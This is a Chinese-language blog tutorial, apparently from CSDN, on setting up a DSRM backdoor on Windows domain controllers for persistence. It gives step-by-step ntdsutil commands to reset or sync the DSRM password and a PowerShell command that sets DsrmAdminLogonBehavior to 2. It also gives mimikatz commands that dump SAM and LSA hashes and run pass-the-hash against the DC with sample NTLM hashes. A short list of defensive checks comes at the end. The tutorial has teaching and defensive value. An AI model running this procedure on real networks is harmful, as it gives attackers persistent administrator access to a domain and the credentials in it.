**目录**

[DSRM域后门](#t0 "DSRM域后门")

[修改DSRM密码的方法](#t1 "修改DSRM密码的方法")

[设置DSRM后门](#t2 "设置DSRM后门")

[直接为DSRM设置新密码](#t3 "直接为DSRM设置新密码")

[为DSRM同步域用户test的密码](#t4 "为DSRM同步域用户test的密码")

[DSRM域后门的防御措施](#t5 "DSRM域后门的防御措施")

* * *

> 适用服务器版本：Windows Server 2008及以后版本的Windows服务器

DSRM后门
------

      DSRM是Windows域环境中[域控制器](https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8&spm=1001.2101.3001.7020)的安全模式启动选项。每个域控制器都有一个本地管理员账号(也就是DSRM账号)。DSRM的用途是：允许管理员在域环境出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM的密码需要在安装DC时设置，且很少会被重置。修改DSRM密码最基本的方法是在DC上运行 ntdsutil 命令。

    在渗透测试中，可以使用DSRM账号对域环境进行持久化操作。如果域控制器的系统版本为Windows Server 2008，则需要安装 KB961320 补丁才可以使用指定域账号的密码对DSRM的密码进行同步。在Windows Server 2008以后版本的系统中不需要安装此补丁。如果域控制器的系统版本为Windows Server 2003，则不能使用该方法进行持久化操作。

   我们知道，每个DC都有本地管理员(administrator)账号和密码。DSRM账号可以作为DC的本地管理员用户，通过网络连接DC，进而控制DC。

**注：在DC上，DSRM账号的表现形式是本地的 administrator 用户，也就是说 本地 administrator用户 == DSRM账号**

修改DSRM密码的方法
-----------

1：微软公布了修改DSRM密码的方法。在域控上打开命令行环境，常用命令如下：

*   NTDSUTIL：打开ntdsutil
*   set DSRM password：修改DSRM的密码
*   reset password on  server  null：在当前域控制器上重置DSRM的密码
*   q(第1次)：退出DSRM密码设置模式
*   q(第2次)：退出ntdsutil

![](https://img-blog.csdnimg.cn/20200218172422769.png)

2：如果域控制器的系统版本为Windows Server 2008(已安装KB961320)及以上，可以将DSRM密码同步为已存在的域账号密码。常用命令如下：

*   NTDSUTIL：打开ntdsutil
*   set DSRM password：修改DSRM的密码
*   sync from domain account 域用户名字：使DSRM的密码和指定域用户的密码同步
*   q(第1次)：退出DSRM密码设置模式
*   q(第2次)：退出ntdsutil

![](https://img-blog.csdnimg.cn/20200218165038792.png)

设置DSRM后门
--------

### 直接为DSRM设置新密码

**1：为DSRM设置新密码**

![](https://img-blog.csdnimg.cn/20200218172422769.png)

**2：查看是否设置成功**

也就是查看SAM文件中本地管理员administrator的NTLM哈希值，如图，为：f761258d1c2015c02856d782439c52d7

```
privilege::debug      
token::elevate      
lsadump::sam
```


![](https://img-blog.csdnimg.cn/20200218173725360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**3：修改DSRM的登录方式**

DSRM有三种登录方式，具体如下：

*   0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号
*   1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器
*   2：在任何情况下，都可以使用DSRM管理员账号登录域控制器

在Windows Server 2000以后的版本操作系统中，对DSRM使用控制台登录域控制器进行了限制。如果要使用DSRM账号通过网络登录域控制器，需要将该值设置为2。输入如下命令，可以使用PowerShell进行更改。

```
New-ItemProperty "hklm:\system\currentcontrolset\control\lsa\" -name "dsrmadminlogonbehavior" -value 2 -propertyType DWORD
```


![](https://img-blog.csdnimg.cn/20200218165742777.png)

**4：使用本地administrator账号哈希传递攻击域控**

在任意一条域成员主机中使用mimikatz进行哈希传递攻击登录域控

```
privilege::Debug      
sekurlsa::pth /domain:WIN2008 /user:administrator /ntlm:f761258d1c2015c02856d782439c52d7
```


### ![](https://img-blog.csdnimg.cn/20200218174357188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 为DSRM同步域用户test的密码

**1：使用mimikatz查看域用户test的NTLM哈希**

由图可知，域用户test的NTLM哈希为：51b7f7dca9302c839e48d039ee37f0d1

```
privilege::debug      
lsadump::lsa /patch /name:test
```


![](https://img-blog.csdnimg.cn/20200218165205891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**2：将DSRM账号和域账号test的NTLM Hash同步**

```
ntdsutil      
set dsrm password      
sync from domain account test      
q      
q
```


![](https://img-blog.csdnimg.cn/20200218165038792.png)

**3：查看DSRM的NTLM Hash是否同步成功**

由图可知，本地管理员administrator的NTLM哈希已同步为域用户test的NTLM哈希：51b7f7dca9302c839e48d039ee37f0d1

```
privilege::debug      
token::elevate      
lsadump::sam
```


![](https://img-blog.csdnimg.cn/20200218165336510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**4：修改DSRM的登录方式**

DSRM有三种登录方式，具体如下：

*   0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号
*   1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器
*   2：在任何情况下，都可以使用DSRM管理员账号登录域控制器

在Windows Server 2000以后的版本操作系统中，对DSRM使用控制台登录域控制器进行了限制。如果要使用DSRM账号通过网络登录域控制器，需要将该值设置为2。输入如下命令，可以使用PowerShell进行更改。

```
New-ItemProperty "hklm:\system\currentcontrolset\control\lsa\" -name "dsrmadminlogonbehavior" -value 2 -propertyType DWORD
```


![](https://img-blog.csdnimg.cn/20200218165742777.png)

**5：使用本地administrator账号哈希传递攻击域控**

在任意一条域成员主机中使用mimikatz进行哈希传递攻击登录域控

```
privilege::Debug      
sekurlsa::pth /domain:WIN2008 /user:administrator /ntlm:51b7f7dca9302c839e48d039ee37f0d1
```


![](https://img-blog.csdnimg.cn/20200218170602229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### DSRM域后门的防御措施

*   定期检查注册表中用于控制DSRM登录方式的键值 HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior，确认该兼职为1，或者删除该键值
*   定期修改域中所有域控制器的DSRM账号
*   经常检查ID 为4794的日志。尝试设置活动目录服务还原模式的管理员密码会被记录在4794日志中

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)